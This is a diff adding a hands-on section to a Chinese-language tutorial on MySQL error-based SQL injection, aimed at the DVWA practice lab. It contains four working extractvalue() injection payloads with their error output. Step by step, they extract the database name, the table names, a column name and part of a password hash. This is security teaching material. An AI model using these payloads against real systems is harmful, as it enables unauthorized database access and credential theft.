@@ -312,6 +312,30 @@ select exp(~(select * from (select database())x));
 * **溢出条件**：在计算机中，双精度浮点数能表示的最大值是有限的。在 MySQL 中，当 `exp()` 的参数 $x$ 大于约 `709.78` 时，计算结果就会超出双精度浮点数的最大范围，从而触发 **"Double value out of range"（双精度数值超出范围）** 的溢出错误。
 * **信息回显**：在 **MySQL 5.5.x** 等较早版本中，当 `exp()` 发生溢出报错时，数据库会将导致溢出的查询结果作为错误信息的一部分返回给客户端。
 
+<span style="font-size: 19px;">**实战**</span>
+
+靶机：**DVWA** SQL Injection
+
+```bash
+' and extractvalue(1, concat(0x7e, (select database()))) -- 
+```
+XPATH syntax error: '~dvwa'
+
+```bash
+' and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='dvwa' ))) --  
+```
+XPATH syntax error: '~guestbook,users'
+
+```bash
+' and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users' limit 4,1 ))) --  
+```
+XPATH syntax error: '~password'
+
+```bash
+' and extractvalue(1, mid(concat(0x7e, (select password from dvwa.users limit 0,1)),1,29)) -- 
+```
+XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882'
+- `mid()` 函数：**字符串截取**，`MID(str, start, length)`
 
 ---
 
